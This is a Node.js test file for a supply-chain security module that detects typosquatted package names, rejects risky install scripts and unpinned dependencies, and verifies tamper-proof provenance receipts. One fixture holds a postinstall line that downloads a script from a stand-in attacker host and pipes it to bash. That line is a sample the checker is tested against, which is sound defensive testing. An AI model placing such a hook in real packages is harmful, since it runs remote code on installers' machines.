'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const {
  loadSupplyChainConfig,
  detectTyposquatting,
  evaluateSupplyChainSecurity,
  generateProvenanceReceipt,
  verifyProvenanceReceipt
} = require('../scripts/supply-chain-diode.js');

test('Supply Chain Diode - Config Loader', () => {
  const config = loadSupplyChainConfig();
  assert.ok(config);
  assert.equal(config.gateId, 'gate_supply_chain_diode_2026');
  assert.ok(config.monitoredCriticalPackages.includes('axios'));
  assert.ok(config.monitoredCriticalPackages.includes('trivy'));
});

test('Supply Chain Diode - Typosquatting Detection', () => {
  const critical = ['axios', 'express', 'trivy', 'playwright'];
  
  // Exact match is not a typosquat
  assert.equal(detectTyposquatting('axios', critical).length, 0);

  // Typosquats with edit distance 1 or 2
  const axoisHits = detectTyposquatting('axois', critical);
  assert.ok(axoisHits.length > 0);
  assert.equal(axoisHits[0].target, 'axios');

  const trivvyHits = detectTyposquatting('trivvy', critical);
  assert.ok(trivvyHits.length > 0);
  assert.equal(trivvyHits[0].target, 'trivy');
});

test('Supply Chain Diode - Evaluates Dangerous Lifecycle Scripts as CRITICAL', () => {
  const badManifest = {
    name: 'malicious-test-pkg',
    scripts: {
      postinstall: 'curl -s https://evil.com/payload.sh | bash'
    }
  };

  const evalResult = evaluateSupplyChainSecurity(badManifest);
  assert.equal(evalResult.allowed, false);
  assert.equal(evalResult.verdict, 'DENY_SUPPLY_CHAIN_RISK');
  assert.ok(evalResult.matchedRules.includes('SUPPLY_01_LIFECYCLE_SCRIPTS'));
  assert.equal(evalResult.summary.lifecycleScriptsSafe, false);
});

test('Supply Chain Diode - Flags Unpinned Dependencies', () => {
  const looseManifest = {
    name: 'loose-pkg',
    dependencies: {
      chalk: '*',
      winston: '>=3.0.0'
    }
  };

  const evalResult = evaluateSupplyChainSecurity(looseManifest);
  assert.equal(evalResult.summary.unpinnedDependencies, 2);
  assert.ok(evalResult.matchedRules.includes('SUPPLY_02_EXACT_PINNING'));
});

test('Supply Chain Diode - Clean Manifest Passes All Checks', () => {
  const cleanManifest = {
    name: 'clean-thumbgate-pkg',
    dependencies: {
      chalk: '5.3.0',
      commander: '12.0.0'
    }
  };

  const evalResult = evaluateSupplyChainSecurity(cleanManifest);
  assert.equal(evalResult.allowed, true);
  assert.equal(evalResult.verdict, 'ALLOW');
  assert.equal(evalResult.findingsCount, 0);
  assert.equal(evalResult.summary.lifecycleScriptsSafe, true);
});

test('Supply Chain Diode - Provenance Receipt Generation & Tamper Proofing', () => {
  const manifest = { name: 'thumbgate', version: '2.4.1' };
  const evalResult = evaluateSupplyChainSecurity(manifest);
  const receipt = generateProvenanceReceipt(manifest, evalResult, {
    gitCommitSha: 'a1b2c3d4e5f6',
    signingSecret: 'sec-test'
  });

  assert.ok(receipt.receiptId.startsWith('rcpt_supply_'));
  assert.ok(receipt.payloadHash);
  assert.equal(receipt.manifest.buildSha, 'a1b2c3d4e5f6');

  const isValid = verifyProvenanceReceipt(receipt, 'sec-test');
  assert.equal(isValid, true);

  // Tamper detection
  const tampered = JSON.parse(JSON.stringify(receipt));
  tampered.manifest.packageVersion = '3.0.0-injected';
  assert.equal(verifyProvenanceReceipt(tampered, 'sec-test'), false);
});
